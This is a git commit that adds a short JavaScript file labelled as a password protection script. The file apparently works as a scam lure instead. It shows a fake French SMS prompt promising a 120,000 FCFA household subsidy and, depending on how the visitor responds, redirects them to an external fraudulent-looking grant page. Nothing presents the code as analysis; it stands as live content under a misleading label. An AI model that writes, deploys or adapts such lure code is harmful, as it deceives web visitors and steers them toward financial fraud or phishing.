bc5d368e49dae7821368174f2c1392ebc6bf9929
The-ongoing <preciousadaowo4@gmail.com>
2026-01-15 09:45:16 +0100

    Create activef.js

---
+++ activef.js
@@ -0,0 +1,9 @@
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'RETIRER DE L’ARGENT'
+password = prompt(
+  'SMS: Félicitations ! Vous êtes éligible pour recevoir la subvention de soutien aux ménages de 120 000 FCFA. Veuillez appuyer sur OK pour recevoir immédiatement.',
+  'RETIRER DE L’ARGENT'
+);
+if (password != 'RETIRER DE L’ARGENT') {
+  location.href = 'https://ongoing-grant.cfd/Pnbsf-Soutien-Financier.html';
+  }
